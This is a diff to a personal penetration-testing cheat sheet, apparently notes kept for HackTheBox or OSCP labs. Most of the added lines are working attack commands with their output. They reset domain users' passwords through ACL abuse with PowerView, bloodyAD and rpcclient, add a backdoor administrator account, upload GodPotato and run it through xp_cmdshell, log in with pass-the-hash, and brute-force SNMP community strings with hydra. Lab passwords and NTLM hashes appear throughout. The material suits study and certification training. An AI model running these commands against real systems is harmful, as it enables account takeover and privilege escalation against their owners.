@@ -462,7 +462,7 @@ kali> impacket-smbserver -smb2support <sharename> .
 win> copy file \\KaliIP\sharename
 ```
 
-## Adding Users
+## Adding Users / changing passwords
 
 ### Windows
 
@@ -471,6 +471,45 @@ win> copy file \\KaliIP\sharename
 net user hacker hacker123 /add
 net localgroup Administrators hacker /add
 net localgroup "Remote Desktop Users" hacker /ADD
+
+#change passwords!
+#From Windows
+#blake here is the victim user to change his password
+PS C:\Users\Administrator\Desktop> Import-Module .\PowerView.ps1
+PS C:\Users\Administrator\Desktop> Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "painters.htb\blake"}
+PS C:\Users\Administrator\Desktop> Set-DomainUserPassword -Identity blake -AccountPassword (ConvertTo-SecureString 'P@ssw0rd' -AsPlainText -Force) -Verbose
+VERBOSE: [Set-DomainUserPassword] Attempting to set the password for user 'blake'
+VERBOSE: [Set-DomainUserPassword] Password for user 'blake' successfully reset
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+#From Windows
+#Using PowerView.ps1 2nd way is to import another user in powershell and use it to change another user password
+if we are logged in using htb-student and we want to use wley to change damundsen password
+
+Creating a PSCredential Object
+PS C:\Tools> $SecPassword = ConvertTo-SecureString 'transporter@4' -AsPlainText -Force
+PS C:\Tools> $Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword)
+
+Creating a SecureString Object
+PS C:\Tools> $damundsenPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
+
+Changing the User's Password
+PS C:\Tools> Import-Module .\PowerView.ps1
+PS C:\Tools> Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose
+
+VERBOSE: [Get-PrincipalContext] Using alternate credentials
+VERBOSE: [Set-DomainUserPassword] Attempting to set the password for user 'damundsen'
+VERBOSE: [Set-DomainUserPassword] Password for user 'damundsen' successfully reset
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+#From Kali
+kali@kali$ bloodyAD -d BLACKFIELD.local -u 'support' -p '#00^BlackKnight' --host 10.10.10.192 set password audit2020 'Password123$!' 
+[+] Password changed successfully!
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+#From Kali
+└─$ rpcclient 192.168.158.21 -U "svc_helpdesk"%"U299iYRmikYTHDbPbxPoYYfa2j4x4cdg"
+rpcclient $> setuserinfo christopher.lewis 23 'Admin!23'
+
 ```
 
 ### Linux
@@ -499,9 +538,16 @@ fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt <FILE>.zip #Cracking zip fil
 - If there’s an encrypted file, convert it into john hash and crack.
 
 ```powershell
-ssh2john.py id_rsa > hash
+ssh2john id_rsa > hash
 #Convert the obtained hash to John format(above link)
 john hashfile --wordlist=rockyou.txt
+
+#crack the password of a zip file
+zip2john emails.zip > hash.txt
+john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
+
+
+
 ```
 
 ### Hashcat
@@ -819,6 +865,9 @@ crackmapexec smb 192.168.1.100 -u username -p password --users #lists users
 crackmapexec smb 192.168.1.100 -u username -p password --all #all information
 crackmapexec smb 192.168.1.100 -u username -p password -p 445 --shares #specific port
 crackmapexec smb 192.168.1.100 -u username -p password -d mydomain --shares #specific domain
+
+
+#place file on the machine via crackmap
 crackmapexec mssql 172.16.X.X -u USER -p PASS --put-file GodPotato-NET4.exe C:\\Users\\Public\\Downloads\\GodPotato-NET4.exe #put file mssql
 xp_cmdshell C:\Users\Public\Downloads\GodPotato-NET4.exe -cmd "cmd /c net Administrator Password@123" #change password mssql
 psexec.py Administrator@172.16.X.X # login psexec
@@ -832,6 +881,8 @@ smbclient -L //IP #or try with 4 /'s
 smbclient //server/share
 smbclient //server/share -U <username>
 smbclient //server/share -U domain/username
+#login with hash
+smbclient //10.10.71.152/C$ -U Administrator --pw-nt-hash 59b280ba707d22e3ef0aa587fc29ffe5 -W oscp.exam
 smbclient //192.168.230.248/transfer -U relia.com/zachary%54abdf854d8c0653b1be3458454e4a3b #login with hash see RELIA EXTERNAL notes.
 
 #SMBmap
@@ -1012,6 +1063,10 @@ showmount -e <IP>
 ```powershell
 #Nmap UDP scan
 sudo nmap <IP> -A -T4 -p- -sU -v -oN nmap-udpscan.txt
+
+#find a community string
+hydra -P /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt 192.168.99.110 snmp # we found thr string was "security"
+snmpwalk -v1 -c security 192.168.99.110 NET-SNMP-EXTEND-MIB::nsExtendObjects
 
 snmpwalk -v1 -c public 192.168.X.X NET-SNMP-EXTEND-MIB::nsExtendObjects #check for hidden creds
 
